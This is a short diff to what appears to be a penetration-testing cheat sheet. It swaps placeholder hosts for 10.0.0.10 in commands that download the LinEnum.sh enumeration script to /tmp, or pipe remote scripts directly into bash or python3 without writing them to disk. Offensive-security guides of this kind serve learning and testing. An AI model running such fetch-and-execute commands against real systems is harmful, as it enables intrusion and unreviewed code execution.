@@ -35,11 +35,11 @@ Some payloads such as `mkfifo` write files to disk. Keep in  mind that while the
 
 ```bash
 # Standard
-wget https://host/LinEnum.sh -O /tmp/LinEnum.sh
+wget https://10.0.0.10/LinEnum.sh -O /tmp/LinEnum.sh
 curl -o /tmp/LinEnum.sh https://host/LinEnum.sh
 
 # Fileless
-curl https://host/LinEnum.sh | bash
+curl https://10.0.0.10/LinEnum.sh | bash
 wget -qO- https://host/script.py | python3
 ```
 
